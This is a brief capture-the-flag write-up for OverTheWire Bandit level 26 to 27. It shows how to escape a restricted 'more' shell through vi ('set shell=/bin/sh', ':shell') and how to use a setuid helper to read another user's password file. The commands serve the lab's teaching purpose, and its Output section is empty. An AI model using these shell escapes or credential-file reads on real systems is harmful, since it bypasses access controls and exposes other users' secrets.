# **Bandit Level 26 → Level 27**

---

## **🧩 Challenge Description**

Good job getting a shell! Now hurry and grab the password for bandit27!

---

## Explanation

This level continues the concept of restricted environments. When logged in, you're again limited by a custom shell that uses `more`. By pressing `v`, you enter `vi`, and from there, use `:set shell=/bin/sh` followed by `:shell` to spawn an unrestricted shell. Once inside, a special executable `bandit27-do` is found. This program runs any command with the permissions of `bandit27`, allowing us to execute `cat /etc/bandit_pass/bandit27` and retrieve the next password. This level demonstrates shell manipulation, use of `vi` to escape restricted environments, and exploiting setuid binaries.

---

# 🛠️ Commands Used

```bash
1. login to bandit26 using the private key (same as in the previous level):

ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220

2. While in the restricted shell (text viewer using more), press:

v
This opens the message in vi.

3. In vi, set the shell manually:
:set shell=/bin/sh
Then open the shell from vi:

:shell

4. You now have access to a shell! List the files:

ls
You’ll see a binary file named bandit27-do.

5. Run the binary with the command to read the next password:

./bandit27-do cat /etc/bandit_pass/bandit27
```

---

## ✅ Output

---